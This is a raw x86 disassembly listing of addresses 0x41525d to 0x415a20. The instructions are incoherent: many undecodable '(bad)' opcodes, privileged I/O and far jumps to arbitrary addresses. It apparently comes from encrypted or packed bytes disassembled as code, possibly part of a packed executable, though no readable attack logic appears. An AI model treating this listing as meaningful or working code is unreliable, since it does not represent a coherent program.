  41525d:	and    edx,DWORD PTR [edi]
  41525f:	xor    DWORD PTR [edi-0xb],0xffffff95
  415263:	pusha  
  415264:	cwde   
  415265:	gs push esp
  415267:	data16 aas 
  415269:	push   ebp
  41526a:	pop    eax
  41526b:	lock inc eax
  41526d:	dec    esp
  41526e:	iret   
  41526f:	mov    esi,0x4ba383b5
  415274:	or     BYTE PTR [edx-0xd],dh
  415277:	pop    ebx
  415278:	push   ecx
  415279:	jecxz  0x41525e
  41527b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41527c:	dec    eax
  41527d:	js     0x415252
  41527f:	xchg   ebp,ecx
  415281:	jl     0x4152cd
  415283:	cmc    
  415284:	add    ecx,DWORD PTR [esi+0x62517051]
  41528a:	fstp   TBYTE PTR [eax+0x12f382bb]
  415290:	push   edi
  415291:	sub    al,0xf9
  415293:	inc    eax
  415294:	repz test bh,bh
  415297:	sub    ecx,DWORD PTR [ebx+eax*4-0x4311e86d]
  41529e:	(bad)  
  41529f:	mov    ebp,0xacbae8dc
  4152a4:	jl     0x4152c6
  4152a6:	pop    eax
  4152a7:	or     eax,0xc774551b
  4152ac:	js     0x415279
  4152ae:	loopne 0x4152a9
  4152b0:	and    cl,al
  4152b2:	adc    ch,BYTE PTR ds:0xc095c1db
  4152b8:	or     BYTE PTR [edi-0x56806605],cl
  4152be:	xor    BYTE PTR [eax],dh
  4152c0:	scas   al,BYTE PTR es:[edi]
  4152c1:	xor    eax,DWORD PTR [ecx]
  4152c3:	jbe    0x4152f8
  4152c5:	jbe    0x4152d5
  4152c7:	leave  
  4152c8:	popf   
  4152c9:	pop    edx
  4152ca:	xchg   esp,eax
  4152cb:	xchg   ecx,eax
  4152cc:	daa    
  4152cd:	in     al,dx
  4152ce:	pop    ecx
  4152cf:	aam    0x50
  4152d1:	cmc    
  4152d2:	imul   esp,DWORD PTR [eax],0x61
  4152d5:	xor    DWORD PTR [esi],edx
  4152d7:	les    ebx,FWORD PTR [ebx+0x4478044e]
  4152dd:	test   BYTE PTR [ecx],0xa0
  4152e0:	jo     0x415278
  4152e2:	inc    edi
  4152e3:	jbe    0x4152c4
  4152e5:	(bad)  
  4152e7:	sub    ah,ch
  4152e9:	addr16 mov al,0xf4
  4152ec:	mov    al,ds:0xe89bc51b
  4152f1:	inc    eax
  4152f2:	xchg   esp,eax
  4152f3:	fsubr  DWORD PTR [esi-0x2]
  4152f6:	push   cs
  4152f7:	cmp    DWORD PTR [ebx-0x18635e14],0x5ff3e88b
  415301:	mov    ah,0x9e
  415303:	aad    0x58
  415305:	jge    0x415325
  415307:	pop    esp
  415308:	jmp    0x9a43dc9
  41530d:	repz adc edx,DWORD PTR [ebx-0x3d]
  415311:	push   eax
  415312:	sbb    BYTE PTR ds:0x90eebe7e,0xaa
  415319:	test   eax,0xe36b84f9
  41531e:	fs cwde 
  415320:	cmp    eax,0x23cb88a4
  415325:	xchg   ebp,eax
  415326:	pop    ebx
  415327:	cmp    ebp,DWORD PTR [eax+0x4e37f750]
  41532d:	sub    BYTE PTR [ecx+edx*2],al
  415330:	jmp    0x927499a4
  415335:	mov    gs,ebx
  415337:	xor    edx,DWORD PTR [eax+ecx*8+0x68]
  41533b:	fdivr  QWORD PTR [ebp+0x6]
  41533e:	jmp    FWORD PTR [edx-0x445b7fc8]
  415344:	cli    
  415345:	scas   al,BYTE PTR es:[edi]
  415346:	nop
  415347:	cmp    BYTE PTR [eax-0x52],bl
  41534a:	shl    bh,1
  41534c:	or     cl,al
  41534e:	add    cl,BYTE PTR [ecx-0x1a]
  415351:	dec    eax
  415352:	fs aaa 
  415354:	xchg   edx,eax
  415355:	jne    0x415362
  415357:	xor    al,0xca
  415359:	data16 into 
  41535b:	popf   
  41535c:	dec    eax
  41535d:	xchg   ebx,eax
  41535e:	stc    
  41535f:	pop    es
  415360:	pop    ds
  415361:	pop    ebx
  415362:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415363:	xor    DWORD PTR [esi+0x56fad426],eax
  415369:	xor    DWORD PTR [ecx+0x60],0x29
  41536d:	sub    eax,ebx
  41536f:	push   cs
  415370:	ja     0x4153d6
  415372:	push   0xffffffe1
  415374:	or     ebp,DWORD PTR ds:0xf0b67523
  41537a:	add    al,0x97
  41537c:	and    BYTE PTR [ebp+0x38],0x89
  415380:	sub    DWORD PTR ds:0x738335,edi
  415386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415387:	mov    DWORD PTR [edx],eax
  415389:	inc    edx
  41538a:	mov    al,ds:0x97e3c163
  41538f:	js     0x415393
  415391:	fidiv  WORD PTR ds:0x5778f16f
  415397:	aas    
  415398:	adc    al,0xd4
  41539a:	call   0xcfe1:0x1d821533
  4153a1:	stc    
  4153a2:	xor    BYTE PTR [eax],dl
  4153a4:	dec    ebx
  4153a5:	fidivr DWORD PTR [ebp*2+0x5513a340]
  4153ac:	push   edx
  4153ad:	imul   ecx,DWORD PTR [edi-0x1e],0x9
  4153b1:	xchg   ecx,eax
  4153b2:	dec    edx
  4153b3:	fsub   DWORD PTR [edi]
  4153b5:	xor    ebp,DWORD PTR [ebp+0x6b]
  4153b8:	cli    
  4153b9:	ret    
  4153ba:	mov    dh,ch
  4153bc:	lahf   
  4153bd:	xor    dh,BYTE PTR [ebx]
  4153bf:	hlt    
  4153c0:	pushf  
  4153c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153c2:	dec    esp
  4153c3:	inc    eax
  4153c4:	xchg   ebp,eax
  4153c5:	cwde   
  4153c6:	loop   0x415399
  4153c8:	aas    
  4153c9:	mov    dh,BYTE PTR [ebp-0x111498e7]
  4153cf:	js     0x4153c0
  4153d1:	cwde   
  4153d2:	inc    edx
  4153d3:	lods   al,BYTE PTR ds:[esi]
  4153d4:	ficomp WORD PTR [edx+0x71]
  4153d7:	pop    ebx
  4153d8:	dec    esi
  4153d9:	mov    esp,0x43e619b3
  4153de:	cmc    
  4153df:	inc    edx
  4153e0:	sub    ebp,DWORD PTR [esi]
  4153e2:	iret   
  4153e3:	or     al,0x52
  4153e5:	jnp    0x41542d
  4153e7:	nop
  4153e8:	rcr    dl,1
  4153ea:	enter  0xb289,0xe6
  4153ee:	pop    ecx
  4153ef:	push   eax
  4153f0:	cwde   
  4153f1:	jae    0x41537e
  4153f3:	mov    ds:0xcbdc6d9c,eax
  4153f8:	dec    ebp
  4153f9:	mov    edi,0xcde0ac90
  4153fe:	hlt    
  4153ff:	lods   eax,DWORD PTR ds:[esi]
  415400:	int    0x1c
  415402:	add    DWORD PTR [esi+esi*8-0x7e],ebx
  415406:	adc    ch,BYTE PTR [ecx]
  415408:	sub    edi,eax
  41540a:	mov    ds:0xd7b6bfb,eax
  41540f:	fs es (bad) 
  415412:	jb     0x41544d
  415414:	imul   esp,DWORD PTR [ebx],0x907bb4f
  41541a:	ror    ecx,1
  41541c:	pop    esi
  41541d:	pop    ds
  41541e:	mov    dh,BYTE PTR [eax]
  415420:	cmp    al,0xa5
  415422:	sub    DWORD PTR [ecx-0x2],edx
  415425:	jg     0x41547b
  415427:	retf   0x3ab1
  41542a:	repz mov esp,0x6db62baf
  415430:	sar    BYTE PTR [ebx+0x2f1dc410],0x2e
  415437:	outs   dx,DWORD PTR ds:[esi]
  415438:	xchg   esp,eax
  415439:	pushf  
  41543a:	mov    edx,0x1b790d80
  41543f:	add    eax,DWORD PTR [ecx+0x51bea804]
  415445:	inc    ebx
  415446:	dec    edx
  415447:	xor    BYTE PTR [esp+ecx*8],ch
  41544a:	pop    eax
  41544b:	shl    BYTE PTR [edx-0x6df8299a],cl
  415451:	popa   
  415452:	lods   eax,DWORD PTR ds:[esi]
  415453:	sti    
  415454:	and    DWORD PTR [esi+ebx*1],0xffffffe4
  415458:	les    eax,FWORD PTR [edi-0x1981ed8f]
  41545e:	cmp    DWORD PTR [eax],eax
  415460:	pop    ecx
  415461:	stos   DWORD PTR es:[edi],eax
  415462:	add    DWORD PTR [ebp+0x45],edx
  415465:	inc    esp
  415466:	add    BYTE PTR ds:0x87c072c3,ch
  41546c:	lds    ecx,FWORD PTR [edx+esi*1]
  41546f:	pusha  
  415470:	mov    ds:0xedcf59fe,al
  415475:	lods   al,BYTE PTR ds:[esi]
  415476:	out    0x7,eax
  415478:	cwde   
  415479:	mov    ah,0x9a
  41547b:	mov    ebx,es
  41547d:	push   es
  41547e:	sar    DWORD PTR [eax+0x22386c63],1
  415484:	out    0x2,al
  415486:	pusha  
  415487:	jl     0x415427
  415489:	jo     0x415436
  41548b:	outs   dx,DWORD PTR ss:[esi]
  41548d:	push   cs
  41548e:	jbe    0x415467
  415490:	or     cl,BYTE PTR [esi]
  415492:	and    ecx,edx
  415494:	push   DWORD PTR [edx]
  415496:	xor    dl,BYTE PTR [ebp+0x6e]
  415499:	lods   eax,DWORD PTR ds:[esi]
  41549a:	fistp  WORD PTR [eax-0x38]
  41549d:	push   ss
  41549e:	dec    ebx
  41549f:	sbb    eax,0xdfdac6df
  4154a4:	scas   al,BYTE PTR es:[edi]
  4154a5:	and    BYTE PTR [ebx+0x2],dh
  4154a8:	(bad)  
  4154a9:	fwait
  4154aa:	dec    esp
  4154ab:	popf   
  4154ac:	and    DWORD PTR [ebx+0x33],eax
  4154af:	sbb    eax,0xb58da37a
  4154b4:	jno    0x415453
  4154b6:	es mov dl,0xfb
  4154b9:	outs   dx,BYTE PTR ds:[esi]
  4154ba:	sub    cl,BYTE PTR [edx-0xf787412]
  4154c0:	inc    esi
  4154c1:	or     eax,0xab7dfa17
  4154c6:	push   esi
  4154c7:	(bad)  
  4154c8:	mov    bl,0xf1
  4154ca:	push   ebp
  4154cb:	mov    DWORD PTR [eax+ebp*2-0x3f],edx
  4154cf:	loope  0x4154e8
  4154d1:	stos   BYTE PTR es:[edi],al
  4154d2:	pop    ss
  4154d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154d4:	push   esp
  4154d5:	mov    ch,bh
  4154d7:	jp     0x4154d1
  4154d9:	mov    ds:0xda5d1a6f,eax
  4154de:	cld    
  4154df:	mov    ds:0x343d6abb,eax
  4154e4:	add    DWORD PTR [esi],ebp
  4154e6:	out    dx,al
  4154e7:	retf   
  4154e8:	pop    eax
  4154e9:	pop    ss
  4154ea:	jp     0x41548f
  4154ec:	not    BYTE PTR [edi-0x1789dd57]
  4154f2:	test   al,0xef
  4154f4:	aas    
  4154f5:	sbb    BYTE PTR [esi-0x4f0fc6a7],dl
  4154fb:	fld    QWORD PTR [esi-0x27]
  4154fe:	aad    0x5a
  415500:	push   edx
  415501:	add    dl,bh
  415503:	jecxz  0x41550c
  415505:	iret   
  415506:	dec    ebp
  415507:	add    cl,cl
  415509:	lods   eax,DWORD PTR ds:[esi]
  41550a:	pusha  
  41550b:	bound  ecx,QWORD PTR [ecx]
  41550d:	xchg   DWORD PTR [ecx],ecx
  41550f:	mov    al,ds:0xfb56ee73
  415514:	pop    ecx
  415515:	fwait
  415516:	out    0x24,al
  415518:	mov    edi,0xc5aac623
  41551d:	test   DWORD PTR [eax+edx*8],eax
  415520:	or     ch,BYTE PTR [esi+0x787e5b69]
  415526:	and    edx,DWORD PTR [edx-0x9]
  415529:	dec    esi
  41552a:	sbb    al,0xc3
  41552c:	(bad)  
  41552e:	push   cs
  41552f:	test   al,0xcd
  415531:	adc    esp,DWORD PTR [edx]
  415533:	sar    cl,1
  415535:	out    dx,eax
  415536:	inc    esi
  415537:	mov    ah,0x69
  415539:	or     al,0xaa
  41553b:	mov    dh,0xfd
  41553d:	mov    bh,0xc3
  41553f:	mov    edi,0xff689382
  415544:	jle    0x41553e
  415546:	jo     0x4155aa
  415548:	call   0xdde39a5d
  41554d:	add    DWORD PTR [ebx-0x16],0x5c839fcc
  415554:	frstor [edi+0x3c7fe95d]
  41555a:	dec    esp
  41555b:	popf   
  41555c:	xchg   dl,cl
  41555e:	inc    ebp
  41555f:	sub    DWORD PTR ds:0xb20303d8,esp
  415565:	mov    bl,0x80
  415567:	in     al,dx
  415568:	cmc    
  415569:	sub    al,0xa5
  41556b:	iret   
  41556c:	mov    ds:0xbcd969ef,eax
  415571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415572:	imul   ebx,DWORD PTR [ebp+0x3d376cd6],0x4b253980
  41557c:	adc    edx,DWORD PTR [eiz*8-0x14fad699]
  415583:	sub    al,0xa3
  415585:	adc    eax,DWORD PTR [esi-0x457e6fb2]
  41558b:	in     eax,dx
  41558c:	jp     0x41555a
  41558e:	js     0x41553a
  415590:	sbb    ch,ah
  415592:	cmp    eax,0x85d7151a
  415597:	push   ss
  415598:	jmp    0xfcf8:0x2da6429b
  41559f:	lods   eax,DWORD PTR ds:[esi]
  4155a0:	scas   al,BYTE PTR es:[edi]
  4155a1:	inc    ecx
  4155a2:	(bad)  
  4155a3:	pop    edx
  4155a4:	je     0x415623
  4155a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155a7:	dec    edx
  4155a8:	lds    eax,FWORD PTR [ecx+0x4b]
  4155ab:	mov    dl,0x7b
  4155ad:	jbe    0x41562d
  4155af:	popf   
  4155b0:	rcl    BYTE PTR [esi-0xe],cl
  4155b3:	or     BYTE PTR [ebx+0x1b774c08],bl
  4155b9:	dec    edi
  4155ba:	or     esp,ebp
  4155bc:	iret   
  4155bd:	popf   
  4155be:	test   BYTE PTR [edi+0x4c16813f],bh
  4155c4:	lods   al,BYTE PTR ds:[esi]
  4155c5:	shr    DWORD PTR [edx],1
  4155c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155c8:	fcom   QWORD PTR [eax]
  4155ca:	icebp  
  4155cb:	cmp    esi,esi
  4155cd:	or     BYTE PTR [esi+0x582deee1],cl
  4155d3:	js     0x4155f2
  4155d5:	jecxz  0x415607
  4155d7:	arpl   bp,si
  4155d9:	leave  
  4155da:	fadd   DWORD PTR [ebp+0x2bdf3057]
  4155e0:	dec    edi
  4155e1:	mov    cl,0x45
  4155e3:	dec    esp
  4155e4:	imul   ebp,ebx,0x5fd7f567
  4155ea:	shl    BYTE PTR [esi+0x7e],1
  4155ed:	jl     0x41556f
  4155ef:	jo     0x4155cf
  4155f1:	int3   
  4155f2:	sub    dh,BYTE PTR [edi]
  4155f4:	pop    ebx
  4155f5:	iret   
  4155f6:	xchg   BYTE PTR [ebp-0x5ceddd82],dl
  4155fc:	jge    0x4155a8
  4155fe:	inc    edx
  4155ff:	inc    ecx
  415600:	add    esi,DWORD PTR [bx+si-0x1518]
  415605:	fsub   QWORD PTR [ebp-0x28a1e9c2]
  41560b:	in     al,0x45
  41560d:	cmp    dh,BYTE PTR [edx-0x7317cd1f]
  415613:	fs retf 
  415615:	xchg   ecx,eax
  415616:	mov    eax,esp
  415618:	inc    edx
  415619:	cmp    al,0x6
  41561b:	shl    BYTE PTR [ebp+0x189974d7],cl
  415621:	mov    esp,0x96349d26
  415626:	xchg   edi,eax
  415627:	test   eax,0x644b1534
  41562c:	mov    al,ds:0x978a3525
  415631:	int    0x77
  415633:	xchg   ebx,eax
  415634:	adc    DWORD PTR [edx+0x41cb8d4a],ecx
  41563a:	push   cs
  41563b:	(bad)  
  41563d:	int    0xa6
  41563f:	sub    bh,BYTE PTR [ebp-0x69]
  415642:	stos   BYTE PTR es:[edi],al
  415643:	inc    edi
  415644:	inc    ebx
  415645:	loop   0x4155f0
  415647:	es je  0x4156ae
  41564a:	push   ds
  41564b:	xchg   edx,eax
  41564c:	push   es
  41564d:	cmp    BYTE PTR [edx+eiz*4-0xc083c18],bl
  415654:	pop    edi
  415655:	imul   esp,DWORD PTR [ebp+edx*4+0x82b723b],0xffffff94
  41565d:	add    eax,0xaa00654b
  415662:	hlt    
  415663:	(bad)  
  415664:	inc    BYTE PTR [eax-0x66]
  415667:	call   0x7441:0x9dd54864
  41566e:	mov    edi,0xca72a1da
  415673:	inc    edx
  415674:	dec    ebx
  415675:	call   0xa555bdf1
  41567a:	sahf   
  41567b:	es add eax,0xda5519d8
  415681:	sbb    eax,0xadde591e
  415686:	hlt    
  415687:	mov    cl,0x21
  415689:	inc    edx
  41568a:	and    al,0xa4
  41568c:	xchg   esi,eax
  41568d:	adc    DWORD PTR [ebp-0x4c12ddc1],eax
  415693:	mov    cl,0x56
  415695:	loopne 0x41565a
  415697:	test   al,0x62
  415699:	loopne 0x415659
  41569b:	aas    
  41569c:	cmp    ch,BYTE PTR [ebp+edi*2-0xb]
  4156a0:	mov    eax,0x7245c22
  4156a5:	push   DWORD PTR [ebx+edx*2-0x69]
  4156a9:	sub    bh,bl
  4156ab:	call   0x37a3c412
  4156b0:	lock sub BYTE PTR [ebp+0x46],cl
  4156b4:	mov    dh,BYTE PTR [edi-0x11]
  4156b7:	or     si,WORD PTR [edx+0x7d305de8]
  4156be:	ins    DWORD PTR es:[edi],dx
  4156bf:	or     BYTE PTR [ebx+0xaf5156f],ah
  4156c5:	aas    
  4156c6:	or     eax,0x5d545185
  4156cb:	sub    BYTE PTR [ecx],bh
  4156cd:	add    bl,cl
  4156cf:	push   ebp
  4156d0:	repz (bad) 
  4156d2:	out    dx,eax
  4156d3:	or     esp,DWORD PTR [edi-0x3cc8c26f]
  4156d9:	cmp    esi,DWORD PTR [ebx+0x742165f4]
  4156df:	mov    ah,0x33
  4156e1:	ds popf 
  4156e3:	jae    0x4156c2
  4156e5:	fsubr  DWORD PTR [edx]
  4156e7:	mov    eax,0x341ed3e4
  4156ec:	aad    0x64
  4156ee:	push   ebp
  4156ef:	xor    eax,0x708925af
  4156f4:	adc    al,0xfc
  4156f6:	pop    esp
  4156f7:	push   ds
  4156f8:	sub    cl,BYTE PTR [ebx+0x56]
  4156fb:	aas    
  4156fc:	sub    esp,ebp
  4156fe:	adc    ecx,edx
  415700:	xlat   BYTE PTR ss:[ebx]
  415702:	push   0xc67e06a6
  415707:	xchg   esi,edx
  415709:	push   eax
  41570a:	pop    ebp
  41570b:	sbb    bl,BYTE PTR ds:0xfbfbc593
  415711:	mov    al,0x16
  415713:	mov    dl,0x36
  415715:	aad    0xfe
  415717:	jl     0x415711
  415719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41571a:	mov    DWORD PTR [ebp-0x222a821a],eax
  415720:	jl     0x415714
  415722:	push   ebx
  415723:	ret    0x5bfb
  415726:	pop    esp
  415727:	cmp    al,BYTE PTR [ecx+0xc]
  41572a:	aaa    
  41572b:	mov    ebx,0x1754b7be
  415730:	inc    esi
  415731:	in     al,0xcb
  415733:	mov    eax,0x43447688
  415738:	(bad)  [edi+0x66]
  41573b:	mov    bl,0xc9
  41573d:	ins    BYTE PTR es:[edi],dx
  41573e:	imul   ebp,DWORD PTR [eax+0x3d],0xffffffe8
  415742:	mov    ebp,0x57be04f7
  415747:	cmp    DWORD PTR [edi+0x3b],ecx
  41574a:	cmp    DWORD PTR [edx-0x73],0xffffffc6
  41574e:	pop    ebp
  41574f:	imul   edx,ebx,0x0
  415752:	fmul   QWORD PTR [ebx]
  415754:	scas   eax,DWORD PTR es:[edi]
  415755:	mov    esp,ebp
  415757:	ss jp  0x4157d0
  41575a:	lods   eax,DWORD PTR ds:[esi]
  41575b:	gs call 0xd65d3fe2
  415761:	jae    0x41575b
  415763:	retf   0x9175
  415766:	cmp    al,0x7b
  415768:	mov    bl,0x45
  41576a:	adc    eax,0x5c1c4873
  41576f:	sub    cl,BYTE PTR [ecx+0x44e88668]
  415775:	neg    DWORD PTR [esi]
  415777:	in     eax,0x44
  415779:	retf   0xcccf
  41577c:	and    BYTE PTR [eax+0x52],bl
  41577f:	pop    edx
  415780:	fstp   DWORD PTR [edi-0x6c6f91a6]
  415786:	inc    ecx
  415787:	dec    eax
  415788:	xchg   ebp,eax
  415789:	adc    ah,0x64
  41578c:	mov    bl,BYTE PTR ds:0x7356b792
  415792:	std    
  415793:	icebp  
  415794:	imul   esi,DWORD PTR [esi+0xd],0x9d9101c8
  41579b:	int3   
  41579c:	fadd   DWORD PTR [ebx+esi*8+0x2fbaf219]
  4157a3:	fcmovu st,st(5)
  4157a5:	data16 mov dh,0x6b
  4157a8:	push   esp
  4157a9:	scas   eax,DWORD PTR es:[edi]
  4157aa:	je     0x41581e
  4157ac:	imul   ebx,esp,0xb1bbe686
  4157b2:	cmp    BYTE PTR [edx-0x64bb2786],0xc
  4157b9:	cs inc ebp
  4157bb:	mov    WORD PTR [edi+0x62],gs
  4157be:	stos   BYTE PTR es:[edi],al
  4157bf:	lods   eax,DWORD PTR ds:[esi]
  4157c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157c1:	dec    edx
  4157c2:	lahf   
  4157c3:	(bad)  
  4157c4:	lods   al,BYTE PTR ds:[esi]
  4157c5:	shl    cl,0xb5
  4157c8:	hlt    
  4157c9:	arpl   WORD PTR ds:0xf5c1128,bx
  4157cf:	fadd   QWORD PTR [edx+0x232c021]
  4157d5:	jb     0x4157ef
  4157d7:	mov    edx,0xcc84275
  4157dc:	dec    ecx
  4157dd:	mov    dl,0xb6
  4157df:	mov    esp,0x22d2b017
  4157e4:	xchg   DWORD PTR ds:0x6c564a85,edi
  4157ea:	xlat   BYTE PTR ds:[ebx]
  4157eb:	out    0x2e,al
  4157ed:	lock inc ecx
  4157ef:	and    BYTE PTR [eax+0x587f7d11],dl
  4157f5:	fld    st(1)
  4157f7:	(bad)  
  4157f9:	inc    ecx
  4157fa:	inc    edi
  4157fb:	(bad)  
  4157fc:	nop
  4157fd:	sbb    BYTE PTR [eax],ch
  4157ff:	les    ebp,FWORD PTR ds:0x20d18f24
  415805:	ins    DWORD PTR es:[edi],dx
  415806:	aas    
  415807:	(bad)  
  415808:	lods   al,BYTE PTR ds:[esi]
  415809:	repnz add al,0x85
  41580c:	mov    eax,ds:0xbf51a145
  415811:	scas   al,BYTE PTR es:[edi]
  415812:	pushf  
  415813:	fisttp QWORD PTR [ecx-0x1c]
  415816:	jns    0x41586f
  415818:	mov    edi,0x5f189a48
  41581d:	mov    ebp,0x35ba3e8f
  415822:	push   esi
  415823:	inc    edi
  415824:	shr    BYTE PTR [ecx+0xc9a202e],cl
  41582a:	dec    edx
  41582b:	cli    
  41582c:	in     al,0x17
  41582e:	add    bl,BYTE PTR [esi+0x426eddcb]
  415834:	outs   dx,DWORD PTR ds:[esi]
  415835:	fld    TBYTE PTR [ecx+0x66]
  415838:	outs   dx,BYTE PTR ds:[esi]
  415839:	pop    esi
  41583a:	and    BYTE PTR [esi+0x1c8cfe12],0xec
  415841:	jg     0x4158b1
  415843:	je     0x4157f8
  415845:	mov    edi,0xc542c52b
  41584a:	xchg   edx,eax
  41584b:	mov    edx,0x8f751ea9
  415850:	adc    dh,dh
  415852:	in     al,0x33
  415854:	push   esi
  415855:	into   
  415856:	and    ebx,DWORD PTR [eax+eiz*8-0x54]
  41585a:	dec    ebp
  41585b:	cli    
  41585c:	cmp    DWORD PTR [edi+0x0],eax
  41585f:	jb     0x415803
  415861:	add    BYTE PTR [edx-0xf],al
  415864:	or     al,bh
  415866:	in     al,dx
  415867:	inc    esp
  415868:	test   al,0xc3
  41586a:	dec    esi
  41586b:	cwde   
  41586c:	imul   edi,DWORD PTR [edx-0x33],0x5b
  415870:	test   edx,0x51f237b1
  415876:	out    0x4f,eax
  415878:	daa    
  415879:	fisttp DWORD PTR [eax+eiz*8+0x5c756189]
  415880:	xlat   BYTE PTR ds:[ebx]
  415881:	mov    ds:0xa7f0fbd2,eax
  415886:	jmp    0x4158c9
  415888:	push   ecx
  415889:	loop   0x4158ed
  41588b:	pop    ebp
  41588c:	push   es
  41588d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41588e:	retf   
  41588f:	push   eax
  415890:	and    eax,0x1af69ebb
  415895:	psadbw mm0,QWORD PTR [ebp-0x41]
  415899:	js     0x4158a9
  41589b:	cdq    
  41589c:	push   ebp
  41589d:	lds    ebp,FWORD PTR [esi]
  41589f:	cmc    
  4158a0:	add    DWORD PTR [ecx-0x1d],ebx
  4158a3:	xchg   edi,eax
  4158a4:	push   eax
  4158a5:	(bad)  
  4158a6:	cmc    
  4158a7:	ss xcrypt-cbc (bad)
  4158a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158aa:	ror    edi,cl
  4158ac:	inc    ebx
  4158ad:	ins    BYTE PTR es:[edi],dx
  4158ae:	addr16 ret 
  4158b0:	add    esi,DWORD PTR [eax+0x56]
  4158b3:	fs pushf 
  4158b5:	outs   dx,DWORD PTR ds:[esi]
  4158b6:	in     eax,0x29
  4158b8:	xor    DWORD PTR [ebx+edx*8-0x66e2bda3],eax
  4158bf:	(bad)  
  4158c0:	call   0x39ec:0x7e5a828f
  4158c7:	mov    ebx,0x62b4d258
  4158cc:	and    edx,esi
  4158ce:	cmp    BYTE PTR [edi+0x13],dl
  4158d1:	sbb    al,0xdf
  4158d3:	fistp  WORD PTR [ebp-0x2c]
  4158d6:	call   0x58b29054
  4158db:	out    0x70,eax
  4158dd:	add    al,0x42
  4158df:	cmc    
  4158e0:	xor    esi,DWORD PTR [ecx-0x2d647dca]
  4158e6:	push   edi
  4158e7:	je     0x41587e
  4158e9:	mov    eax,0xf5174caa
  4158ee:	adc    eax,0xe1a75a7f
  4158f3:	jg     0x4158ae
  4158f5:	shl    ecx,cl
  4158f7:	inc    edx
  4158f8:	ds xor al,0xd2
  4158fb:	popa   
  4158fc:	jnp    0x415976
  4158fe:	int3   
  4158ff:	repz in al,0x46
  415902:	mov    edi,0x9f780f98
  415907:	fstp   TBYTE PTR [ebp+0x17be42fc]
  41590d:	mov    ds:0x1bf61b24,eax
  415912:	je     0x415945
  415914:	popa   
  415915:	fdivr  st,st(6)
  415917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415918:	cwde   
  415919:	int    0xe8
  41591b:	fwait
  41591c:	sbb    bl,BYTE PTR [eax+0x31]
  41591f:	arpl   WORD PTR [esi],bp
  415921:	cld    
  415922:	jmp    0x41592e
  415924:	imul   ebx,DWORD PTR [edx],0xffffff8b
  415927:	xchg   ebx,eax
  415928:	mov    ebx,0x8d3d247c
  41592d:	push   ebp
  41592e:	push   ds
  41592f:	enter  0x142c,0x1d
  415933:	frstpm(287 only) 
  415935:	jnp    0x415982
  415937:	adc    eax,DWORD PTR [esi-0x5c743193]
  41593d:	dec    ecx
  41593e:	or     al,0x80
  415940:	push   esi
  415941:	push   edx
  415942:	mov    al,BYTE PTR ds:0xa95a710c
  415948:	sbb    eax,0xbb1e5a18
  41594d:	bound  ebx,QWORD PTR ds:[ebp+ebp*4-0x48c3c69f]
  415955:	ja     0x4159c9
  415957:	mov    WORD PTR [edi-0x1ee4da90],es
  41595d:	addr16 cdq 
  41595f:	xor    DWORD PTR [esi],ecx
  415961:	inc    ecx
  415962:	add    bl,BYTE PTR [ecx+0x15]
  415965:	idiv   DWORD PTR [eax+0x59]
  415968:	scas   eax,DWORD PTR es:[edi]
  415969:	data16 test al,0xd9
  41596c:	xchg   ebp,eax
  41596d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41596e:	jmp    0x831039e
  415973:	push   edx
  415974:	scas   eax,DWORD PTR es:[edi]
  415975:	imul   BYTE PTR [ebp+ebx*4-0x1b]
  415979:	outs   dx,DWORD PTR ds:[esi]
  41597a:	jl     0x415924
  41597c:	inc    eax
  41597d:	(bad)  
  41597f:	xchg   esp,eax
  415980:	dec    ebp
  415981:	aaa    
  415982:	and    ebp,0xfffffff9
  415985:	clc    
  415986:	mov    edi,DWORD PTR [edx-0x28dfd942]
  41598c:	fstp   DWORD PTR [edx-0x3c]
  41598f:	mov    ds:0x536d32b0,al
  415994:	in     al,0x38
  415996:	sub    al,BYTE PTR [ebx+0x28]
  415999:	push   esp
  41599a:	adc    esi,DWORD PTR [ebx+0x6f279704]
  4159a0:	int3   
  4159a1:	imul   edi,DWORD PTR ds:0xf5f411ef,0x5f
  4159a8:	sbb    BYTE PTR [ecx+esi*1],cl
  4159ab:	mov    eax,ds:0x10bc5943
  4159b0:	mov    esp,0xa1ef0d43
  4159b5:	pop    ds
  4159b6:	pop    es
  4159b7:	arpl   WORD PTR [eax-0x14],bp
  4159ba:	mov    ch,0xe4
  4159bc:	jge    0x415a10
  4159be:	dec    eax
  4159bf:	mov    bl,0xcd
  4159c1:	fbstp  TBYTE PTR [edx-0x7467d766]
  4159c7:	push   ebx
  4159c8:	imul   BYTE PTR [edx+eax*4+0x28]
  4159cc:	push   eax
  4159cd:	or     al,BYTE PTR [eax]
  4159cf:	(bad)  
  4159d0:	adc    esi,ebp
  4159d2:	imul   BYTE PTR [eax+eiz*4]
  4159d5:	fdiv   st(0),st
  4159d7:	push   es
  4159d8:	or     al,0x14
  4159da:	add    edx,DWORD PTR [ebp+0x2bf2b311]
  4159e0:	push   edi
  4159e1:	sbb    bh,dh
  4159e3:	or     al,0x50
  4159e5:	fsubrp st(0),st
  4159e7:	mov    al,0x99
  4159e9:	sar    DWORD PTR [esi+0x19ba3cf0],1
  4159ef:	sbb    bl,BYTE PTR [eax+esi*1+0x19]
  4159f3:	and    ch,dl
  4159f5:	adc    al,0xb3
  4159f7:	bound  ebx,QWORD PTR [edx-0x4a]
  4159fa:	sub    eax,0x718eed1a
  4159ff:	mov    eax,ds:0x7c05068d
  415a04:	loopne 0x4159bc
  415a06:	sub    eax,0x79f9fe2c
  415a0b:	add    eax,0xc6cd302
  415a10:	ins    DWORD PTR es:[edi],dx
  415a11:	mov    fs,WORD PTR [edi+0x53cd62a7]
  415a17:	cli    
  415a18:	adc    ah,BYTE PTR [ecx+0x5f4efb15]
  415a1e:	xor    al,0x59
  415a20:	add    DWORD PTR [edi],edx
